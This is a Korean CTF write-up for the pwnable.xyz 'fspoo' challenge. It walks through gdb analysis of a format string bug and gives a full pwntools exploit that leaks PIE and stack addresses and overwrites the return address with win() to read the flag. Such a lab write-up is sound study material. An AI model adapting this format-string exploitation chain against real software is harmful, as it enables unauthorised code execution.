# [WriteUp]pwnable.xyz - fspoo

:black_nib:ChyKor12(sjjo0225@gmail.com)

---

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

PIE가 걸려 있는 바이너리이다. PEDA를 이용한 정적 분석에서 PIE base는 `0x56555000`이 된다. 함수 이름이 매핑되어 있기 때문에 PIE를 신경쓰지 않고 break point를 걸어도 문제없이 분석할 수 있다.

---

```bash
[-------------------------------------code-------------------------------------]
   0x56555a64 <main+60>:	lea    eax,[eax+0x30]
   0x56555a67 <main+63>:	push   eax
   0x56555a68 <main+64>:	push   0x0
=> 0x56555a6a <main+66>:	call   0x56555610 <read@plt>
   0x56555a6f <main+71>:	add    esp,0x10
   0x56555a72 <main+74>:	call   0x565558d2 <vuln>
   0x56555a77 <main+79>:	mov    eax,0x0
   0x56555a7c <main+84>:	lea    esp,[ebp-0x8]
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x56557070 --> 0x0 
arg[2]: 0x1f
```

`main+66`에서는 `read(0, 0x56557070, 0x1f);`를 호출한다.

```bash
gdb-peda$ x/6gx 0x56557070
0x56557070 <cmd+48>:	0x0000000000000000	0x0000000000000000
0x56557080 <cmd+64>:	0x0000000000000000	0x0000000000000000
0x56557090 <flag>:	0x0000000000000000	0x0000000000000000
```

`0x56557070`에는 `cmd`라는 전역 변수가 있다.

```bash
gdb-peda$ x/10gx 0x56557040
0x56557040 <cmd>:	0x0000000000000000	0x0000000000000000
0x56557050 <cmd+16>:	0x0000000000000000	0x0000000000000000
0x56557060 <cmd+32>:	0x00000a3a756e654d	0x0000000000000000
0x56557070 <cmd+48>:	0x4141414141414141	0x0000000000000a41
0x56557080 <cmd+64>:	0x0000000000000000	0x0000000000000000
```

`main()`에서 우리가 입력한 Name은 `0x56557070`에 저장된다는 사실을 기억하고 넘어가자.

---

`vuln()`에서는 3개의 메뉴 중에서 선택하도록 하는데, 하나씩 살펴보도록 하자.

```bash
gdb-peda$ pd vuln
Dump of assembler code for function vuln:
...
   0x56555949 <+119>:	cmp    eax,0x1
   0x5655594c <+122>:	je     0x56555969 <vuln+151>
...
   0x56555969 <+151>:	sub    esp,0xc
   0x5655596c <+154>:	lea    eax,[ebx-0x142c]
   0x56555972 <+160>:	push   eax
   0x56555973 <+161>:	call   0x56555618 <printf@plt>
   0x56555978 <+166>:	add    esp,0x10
   0x5655597b <+169>:	sub    esp,0x4
   0x5655597e <+172>:	push   0x1f
   0x56555980 <+174>:	lea    eax,[ebx+0xa0]
   0x56555986 <+180>:	lea    eax,[eax+0x30]
   0x56555989 <+183>:	push   eax
   0x5655598a <+184>:	push   0x0
   0x5655598c <+186>:	call   0x56555610 <read@plt>
   0x56555991 <+191>:	add    esp,0x10
   0x56555994 <+194>:	jmp    0x565559e1 <vuln+271>
```

`1. Edit name.`을 선택했을 때 실행되는 코드이다. 

```bash
[-------------------------------------code-------------------------------------]
   0x56555986 <vuln+180>:	lea    eax,[eax+0x30]
   0x56555989 <vuln+183>:	push   eax
   0x5655598a <vuln+184>:	push   0x0
=> 0x5655598c <vuln+186>:	call   0x56555610 <read@plt>
   0x56555991 <vuln+191>:	add    esp,0x10
   0x56555994 <vuln+194>:	jmp    0x565559e1 <vuln+271>
   0x56555996 <vuln+196>:	sub    esp,0x4
   0x56555999 <vuln+199>:	lea    eax,[ebx+0xa0]
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x56557070 ("AAAAAAAAA\n")
arg[2]: 0x1f
```

`vuln+186`에서는 우리가 입력했던 Name을 수정할 수 있다. `main+66`에서와 같은 방식으로 문자열을 받아서 저장한다.

---

```bash
gdb-peda$ pd vuln
Dump of assembler code for function vuln:
...
   0x5655595d <+139>:	cmp    eax,0x2
   0x56555960 <+142>:	je     0x56555996 <vuln+196>
...
   0x56555996 <+196>:	sub    esp,0x4
   0x56555999 <+199>:	lea    eax,[ebx+0xa0]
   0x5655599f <+205>:	lea    eax,[eax+0x30]
   0x565559a2 <+208>:	push   eax
   0x565559a3 <+209>:	lea    eax,[ebx-0x1425]
   0x565559a9 <+215>:	push   eax
   0x565559aa <+216>:	lea    eax,[ebx+0xa0]
   0x565559b0 <+222>:	push   eax
   0x565559b1 <+223>:	call   0x56555678 <sprintf@plt>
   0x565559b6 <+228>:	add    esp,0x10
   0x565559b9 <+231>:	jmp    0x565559e1 <vuln+271>
```

`2. Prep msg.`를 선택했을 때 실행되는 코드이다. 

```bash
[-------------------------------------code-------------------------------------]
   0x565559a9 <vuln+215>:	push   eax
   0x565559aa <vuln+216>:	lea    eax,[ebx+0xa0]
   0x565559b0 <vuln+222>:	push   eax
=> 0x565559b1 <vuln+223>:	call   0x56555678 <sprintf@plt>
   0x565559b6 <vuln+228>:	add    esp,0x10
   0x565559b9 <vuln+231>:	jmp    0x565559e1 <vuln+271>
   0x565559bb <vuln+233>:	sub    esp,0xc
   0x565559be <vuln+236>:	lea    eax,[ebx+0xa0]
Guessed arguments:
arg[0]: 0x56557040 --> 0x0 
arg[1]: 0x56555b7b --> 0xa9929ff0 
arg[2]: 0x56557070 ("AAAAAAAAA\n")
```

`vuln+223`에서는 `sprintf()`를 호출하여 `0x56557040`에 문자열을 저장하는데, 포맷 스트링은 `0x56555b7b`에 있고, 인자는 `0x56557070`에 저장된 문자열, 즉 우리가 입력한 Name이 된다.

```bash
gdb-peda$ x/s 0x56555b7b
0x56555b7b:	"💩   %s"
```

코드가 실행된 뒤에 `cmd` 변수의 메모리를 보면 다음과 같다.

```bash
gdb-peda$ x/10gx 0x56557040
0x56557040 <cmd>:	0x41202020a9929ff0	0x4141414141414141
0x56557050 <cmd+16>:	0x000000000000000a	0x0000000000000000
0x56557060 <cmd+32>:	0x00000a3a756e654d	0x0000000000000000
0x56557070 <cmd+48>:	0x4141414141414141	0x0000000000000a41
0x56557080 <cmd+64>:	0x0000000000000000	0x0000000000000000
```

우리가 입력한 Name은 `0x56557047`부터 저장된다. 그런데 Name을 입력받을 때 `read(0, 0x56557070, 0x1f);`를 호출해서 입력받기 때문에 최대 길이는 `0x1f`바이트이다. 그러면 `0x56557047`부터 `0x56557066` 까지의 메모리를 우리가 원하는 값으로 채울 수 있다.

```bash
gdb-peda$ x/s 0x56557060
0x56557060 <cmd+32>:	"Menu:\n"
```

```bash
[-------------------------------------code-------------------------------------]
   0x565558f2 <vuln+32>:	lea    eax,[ebx+0xa0]
   0x565558f8 <vuln+38>:	lea    eax,[eax+0x20]
   0x565558fb <vuln+41>:	push   eax
=> 0x565558fc <vuln+42>:	call   0x56555618 <printf@plt>
   0x56555901 <vuln+47>:	add    esp,0x10
   0x56555904 <vuln+50>:	sub    esp,0xc
   0x56555907 <vuln+53>:	lea    eax,[ebx-0x1464]
   0x5655590d <vuln+59>:	push   eax
Guessed arguments:
arg[0]: 0x56557060 ("Menu:\n")
```

`0x56557060`에 있는 문자열은 `vuln+42`에서 `printf()`의 포맷 스트링으로 사용되는데, 이 문자열을 덮어쓸 수 있다면 결과적으로 format string bug가 발생하게 된다.

---

```bash
gdb-peda$ pd vuln
Dump of assembler code for function vuln:
...
   0x56555962 <+144>:	cmp    eax,0x3
   0x56555965 <+147>:	je     0x565559bb <vuln+233>
...
   0x565559bb <+233>:	sub    esp,0xc
   0x565559be <+236>:	lea    eax,[ebx+0xa0]
   0x565559c4 <+242>:	push   eax
   0x565559c5 <+243>:	call   0x56555648 <puts@plt>
   0x565559ca <+248>:	add    esp,0x10
   0x565559cd <+251>:	jmp    0x565559e1 <vuln+271>
```

`3. Print msg.`를 선택했을 때 실행되는 코드이다. 

```bash
[-------------------------------------code-------------------------------------]
   0x565559bb <vuln+233>:	sub    esp,0xc
   0x565559be <vuln+236>:	lea    eax,[ebx+0xa0]
   0x565559c4 <vuln+242>:	push   eax
=> 0x565559c5 <vuln+243>:	call   0x56555648 <puts@plt>
   0x565559ca <vuln+248>:	add    esp,0x10
   0x565559cd <vuln+251>:	jmp    0x565559e1 <vuln+271>
   0x565559cf <vuln+253>:	sub    esp,0xc
   0x565559d2 <vuln+256>:	lea    eax,[ebx-0x141b]
Guessed arguments:
arg[0]: 0x56557040 --> 0xa9929ff0
```

`puts()`로 `0x56557040`에 저장된 문자열을 출력한다. 별다른 취약점은 발생하지 않는 것 같다.

---

```bash
hykor12@ubuntu:~/pwnable.xyz$ objdump -d fspoo

fspoo:     file format elf32-i386
...
000009fd <win>:
 9fd:	55                   	push   %ebp
 9fe:	89 e5                	mov    %esp,%ebp
 a00:	53                   	push   %ebx
 a01:	83 ec 04             	sub    $0x4,%esp
 a04:	e8 7d 00 00 00       	call   a86 <__x86.get_pc_thunk.ax>
 a09:	05 97 15 00 00       	add    $0x1597,%eax
 a0e:	83 ec 0c             	sub    $0xc,%esp
 a11:	8d 90 90 eb ff ff    	lea    -0x1470(%eax),%edx
 a17:	52                   	push   %edx
 a18:	89 c3                	mov    %eax,%ebx
 a1a:	e8 31 fc ff ff       	call   650 <system@plt>
 a1f:	83 c4 10             	add    $0x10,%esp
 a22:	90                   	nop
 a23:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 a26:	c9                   	leave  
 a27:	c3                   	ret
 ...
```

`objdump`로 바이너리를 까 보니 `win()`이라는 함수가 있다. 아마도 이 함수를 호출하면 쉘을 주든 플래그를 주든 할 것 같다.

```bash
gdb-peda$ b* win+29
Breakpoint 8 at 0x56555a1a
gdb-peda$ set $eip=win
gdb-peda$ c
Continuing.
...
[-------------------------------------code-------------------------------------]
   0x56555a11 <win+20>:	lea    edx,[eax-0x1470]
   0x56555a17 <win+26>:	push   edx
   0x56555a18 <win+27>:	mov    ebx,eax
=> 0x56555a1a <win+29>:	call   0x56555650 <system@plt>
   0x56555a1f <win+34>:	add    esp,0x10
   0x56555a22 <win+37>:	nop
   0x56555a23 <win+38>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56555a26 <win+41>:	leave
Guessed arguments:
arg[0]: 0x56555b30 ("cat flag")
...
```

`win+29`에서는 `system("cat flag");`를 호출한다. `win()`을 호출하는 것이 최종 목적이 되었다.

---

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

보호기법을 확인해 보면 PIE가 걸려 있어서 함수들의 주소가 계속 바뀐다. 일단 뭐든 릭을 하고 eip를 조작하는 과정을 거쳐야 한다. `vuln()`은 계속 반복되기 때문에 FSB를 무한으로 즐길 수 있다는 사실을 기억하자.

우선 스택에서 뽑아낼 수 있는 값이 무엇이 있는지 확인해 보자. `vuln+42`에서 `printf()`가 호출되기 직전의 스택 프레임을 관찰해 보자.

```bash
gdb-peda$ x/12wx $esp
0xffffd130:	0x56557060	0xf7fb6000	0xffffd158	0x56555943
0xffffd140:	0x0000003c	0x56556fa0	0x00000003	0xd128be00
0xffffd150:	0x00000000	0x56556fa0	0xffffd168	0x56555a77
gdb-peda$ i r ebp
ebp            0xffffd158          0xffffd158
```

가장 쉽게 생각할 수 있는 것은 ebp가 `0xffffd158`이므로 `vuln()`의 return address는 `0xffffd15c`에 저장되어 있을 것이고, 그 주소는 아마도 `main()`에서 `vuln()`의 호출이 끝나고 난 바로 다음에 실행되는 코드의 주소라는 사실이다.

```bash
gdb-peda$ x/i 0x56555a77
   0x56555a77 <main+79>:	mov    eax,0x0
```

`main+79`의 주소이다. 이 주소에서 `0xa77`을 빼면 PIE base가 된다. FSB를 발생시킬 때 `0x56557060`이 포맷 스트링이 되고 `0xf7fb6000`부터 그 다음 인자로 들어가기 때문에 포맷 스트링을 `"%11$p"`로 주면 `0x56555a77`이 출력될 것이다. 확인해 보자. 입력값은 앞에 25바이트만큼의 더미를 줘서 `"A"*0x19+"%11$p"`로 주면 된다.

```bash
gdb-peda$ x/s 0x56557060
0x56557060 <cmd+32>:	"%11$p\n"
gdb-peda$ c
Continuing.
0x56555a77
1. Edit name.
2. Prep msg.
3. Print msg.
4. Exit.
```

깔끔하게 릭이 된다. 그러면 text 영역의 함수들의 주소는 오프셋을 찾아서 모두 계산할 수 있다.

---

같은 방식으로 스택의 주소도 릭하여 ASLR을 우회할 수 있다. ebp인 `0xffffd158`에 저장된 값이 SFP이기 때문에 이번에는 `"%10$p"`를 포맷 스트링으로 주면 된다.

```bash
gdb-peda$ x/s 0x56557060
0x56557060 <cmd+32>:	"%10$p\n"
gdb-peda$ c
Continuing.
0xffffd168
1. Edit name.
2. Prep msg.
3. Print msg.
4. Exit.
```

이제 스택 영역의 주소도 알아낼 수 있다.

---

이제 어떻게 exploit할지 생각해 보자. full relro가 걸려 있기 때문에 GOT overwrite는 불가능하다. 메뉴를 선택할 때 0을 입력하면 `vuln+276`으로 점프하여 리턴하기 때문에 `vuln()`의 return address를 `win()`의 주소로 덮고 0을 입력하는 방법을 생각해볼 수 있다.

```bash
gdb-peda$ pd vuln
Dump of assembler code for function vuln:
...
   0x56555936 <+100>:	call   0x56555680 <__isoc99_scanf@plt>
   0x5655593b <+105>:	add    esp,0x10
   0x5655593e <+108>:	call   0x56555620 <getchar@plt>
   0x56555943 <+113>:	mov    eax,DWORD PTR [ebp-0x10]
   0x56555946 <+116>:	movzx  eax,al
   0x56555949 <+119>:	cmp    eax,0x1
   0x5655594c <+122>:	je     0x56555969 <vuln+151>
   0x5655594e <+124>:	cmp    eax,0x1
   0x56555951 <+127>:	jg     0x5655595d <vuln+139>
   0x56555953 <+129>:	test   eax,eax
   0x56555955 <+131>:	je     0x565559e6 <vuln+276>
   0x5655595b <+137>:	jmp    0x565559cf <vuln+253>
   0x5655595d <+139>:	cmp    eax,0x2
   0x56555960 <+142>:	je     0x56555996 <vuln+196>
   0x56555962 <+144>:	cmp    eax,0x3
   0x56555965 <+147>:	je     0x565559bb <vuln+233>
   0x56555967 <+149>:	jmp    0x565559cf <vuln+253>
...
```

위의 코드는 `vuln()`에서 메뉴 선택을 받는 과정이다. 눈여겨보아야 할 부분은 `vuln+113`과 `vuln+116` 두 줄인데, `scanf()`로 입력받은 정수를 eax에 복사한 다음 마지막 1바이트만 남겨서 비교한다. 즉, 상위 3바이트는 메뉴 선택에 영향을 미치지 않는다는 것이다. 그렇다면 `scanf()`에서 `0x56557101` 같은 큰 값을 입력받았다고 쳐도 마지막 1바이트만 남기 때문에 `1. Edit name.`으로 넘어가게 된다.

```bash
[-------------------------------------code-------------------------------------]
   0x565558f2 <vuln+32>:	lea    eax,[ebx+0xa0]
   0x565558f8 <vuln+38>:	lea    eax,[eax+0x20]
   0x565558fb <vuln+41>:	push   eax
=> 0x565558fc <vuln+42>:	call   0x56555618 <printf@plt>
   0x56555901 <vuln+47>:	add    esp,0x10
   0x56555904 <vuln+50>:	sub    esp,0xc
   0x56555907 <vuln+53>:	lea    eax,[ebx-0x1464]
   0x5655590d <vuln+59>:	push   eax
Guessed arguments:
arg[0]: 0x56557060 ("%10$p\n")
```

우리가 FSB를 발생시켰던 `printf()`의 인자는 `0x56557060`이다.

```bash
gdb-peda$ x/20wx 0x56557040
0x56557040 <cmd>:	0xa9929ff0	0x41202020	0x41414141	0x41414141
0x56557050 <cmd+16>:	0x41414141	0x41414141	0x41414141	0x41414141
0x56557060 <cmd+32>:	0x24303125	0x00000a70	0x00000000	0x00000000
0x56557070 <cmd+48>:	0x41414141	0x41414141	0x41414141	0x41414141
0x56557080 <cmd+64>:	0x41414141	0x41414141	0x30312541	0x000a7024
```

메모리를 보면, `0x56557060`의 문자열은 `NULL` 이전까지로 인식되기 때문에 지금은 `"%10$p\n"`으로 들어간다. 만약 `0x5655706f`까지의 메모리를 `NULL` 없이 가득 채울 수 있다면 포맷 스트링이 그 뒤까지 쭉 이어져서, 우리가 `0x1f`바이트만큼 입력할 수 있는 Name이 그대로 포맷 스트링으로 들어가게 될 것이다. 위에서는 포맷 스트링을 최대 6바이트까지밖에 만들 수 없었는데, 길이 제한이 `0x1f`바이트가 되면 자유롭게 포맷 스트링을 구성할 수 있을 것이다.

포맷 스트링을 `"A%6$hn"`처럼 구성하면, 스택 프레임을 관찰해 보았을 때 `ebp-0x10`에 있는 주소에 `0x1`이라는 값이 적히게 된다. 그런데 `ebp-0x10`에는 우리가 `vuln+100`에서 입력한 정수가 그대로 들어간다. 즉 원하는 주소에 `0x1`이라는 값을 넣을 수 있다. 이것을 반복하면 `0x56557065`부터 `0x5655706f`까지 `NULL` 없이 가득 채울 수 있다.

일단 지금까지의 과정을 파이썬 코드로 만들어 보자.

```python
# exploit_fspoo.py

from pwn import *

r = process("./fspoo")
# r = remote("svc.pwnable.xyz", 30010)

def Edit(Name):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Name: ")
    r.send(Name)

def Prep():
    r.recvuntil("> ")
    r.sendline("2")

def Print():
    r.recvuntil("> ")
    r.sendline("3")

def Exit():
    r.recvuntil("> ")
    r.sendline("0")

r.recvuntil("Name: ")
r.sendline("A" * 0x19 + "%11$p")

Prep()
PIEbase = int(r.recvline()[2:-1], 16) - 0xa77 # address of PIE base
addr_win = PIEbase + 0x9fd # address of win()
log.info("address of win(): " + hex(addr_win))
addr_cmd = PIEbase + 0x2040 # address of variable 'cmd'
log.info("address of variable 'cmd': " + hex(addr_cmd))

Edit("A" * 0x19 + "%10$p")
Prep()
addr_ret = int(r.recvline()[2:-1], 16) - 0xc # address where return address is on
log.info("return address is on " + hex(addr_ret))

writable = addr_cmd + 0xc0 # address of writable memory
log.info("address of writable memory: " + hex(writable))

Edit("A" * 0x19 + "B%6$hn")
r.recvuntil("> ")
pause()
r.sendline(str(writable + 0x2))

for i in range(0x26, 0x30):
    r.recvuntil("> ")
    r.sendline(str(addr_cmd + i))

r.recvuntil("> ")
pause()
r.sendline(str(writable + 0x1))

r.interactive()
```

`pause()`가 걸린 상태에서 `cmd`의 메모리를 관찰해 보자.

```bash
gdb-peda$ x/20wx 0x565a7040
0x565a7040 <cmd>:	0xa9929ff0	0x41202020	0x41414141	0x41414141
0x565a7050 <cmd+16>:	0x41414141	0x41414141	0x41414141	0x41414141
0x565a7060 <cmd+32>:	0x24362542	0x01016e68	0x01010101	0x01010101
0x565a7070 <cmd+48>:	0x41414100	0x41414141	0x41414141	0x41414141
0x565a7080 <cmd+64>:	0x41414141	0x41414141	0x36254241	0x006e6824
```

`NULL` 없이 채워진 것을 확인할 수 있다. `0x565a7070`에 있는 `NULL` 1바이트는 `1. Edit name.`을 하면 채울 수 있다. 이 상태에서 기존의 포맷 스트링은 무시하고 새로운 포맷 스트링을 만들어서 return address를 원하는 값으로 덮을 수 있다. `win()`과 `main+79`의 상위 2바이트는 같기 때문에 그대로 두고, `win()`의 하위 2바이트만 return address의 하위 2바이트에 덮어 주면 된다.

```python
addr_win_low = int(hex(addr_win)[6:], 16) # low 2byte of address of win()

r.recvuntil("> ")
r.sendline(str(writable + 0x1))
r.recvuntil("Name: ")
r.send("%" + str(addr_win_low - 0x19) + "x%6$hn")

r.recvuntil("> ")
r.sendline("-" + str(0x100000000 - addr_ret))

Exit()
```

---

최종 익스플로잇은 다음과 같다.

```python
# exploit_fspoo.py

from pwn import *

# r = process("./fspoo")
r = remote("svc.pwnable.xyz", 30010)

def Edit(Name):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Name: ")
    r.send(Name)

def Prep():
    r.recvuntil("> ")
    r.sendline("2")

def Print():
    r.recvuntil("> ")
    r.sendline("3")

def Exit():
    r.recvuntil("> ")
    r.sendline("0")

r.recvuntil("Name: ")
r.sendline("A" * 0x19 + "%11$p")

Prep()
PIEbase = int(r.recvline()[2:-1], 16) - 0xa77 # address of PIE base
addr_win = PIEbase + 0x9fd # address of win()
log.info("address of win(): " + hex(addr_win))
addr_cmd = PIEbase + 0x2040 # address of variable 'cmd'
log.info("address of variable 'cmd': " + hex(addr_cmd))

Edit("A" * 0x19 + "%10$p")
Prep()
addr_ret = int(r.recvline()[2:-1], 16) - 0xc # address where return address is on
log.info("return address is on " + hex(addr_ret))

writable = addr_cmd + 0xc0 # address of writable memory
log.info("address of writable memory: " + hex(writable))

Edit("A" * 0x19 + "B%6$hn")
r.recvuntil("> ")
r.sendline(str(writable + 0x2))

for i in range(0x26, 0x30):
    r.recvuntil("> ")
    r.sendline(str(addr_cmd + i))

addr_win_low = int(hex(addr_win)[6:], 16) # low 2byte of address of win()

r.recvuntil("> ")
r.sendline(str(writable + 0x1))
r.recvuntil("Name: ")
r.send("%" + str(addr_win_low - 0x19) + "x%6$hn")

r.recvuntil("> ")
r.sendline("-" + str(0x100000000 - addr_ret))

Exit()

r.interactive()
```

```bash
chykor12@ubuntu:~/pwnable.xyz$ python exploit_fspoo.py
[+] Opening connection to svc.pwnable.xyz on port 30010: Done
[*] address of win(): 0x5663b9fd
[*] address of variable 'cmd': 0x5663d040
[*] return address is on 0xff7f9f9c
[*] address of writable memory: 0x5663d100
[*] Switching to interactive mode
FLAG{keen_eye_on_details}[*] Got EOF while reading in interactive
$ 
```

---

:question: 처음에는 `"%6$hn"` 전에 `0x10`바이트만큼의 더미가 있으니 `addr_win_low - 0x10`을 넣으면 될 줄 알았는데 그렇게 하니까 주소가 안 맞아서 결과에 맞춰서 `addr_win_low - 0x19`로 바꿨다. 풀긴 했는데 정확히 무슨 원리인지 모르겠다.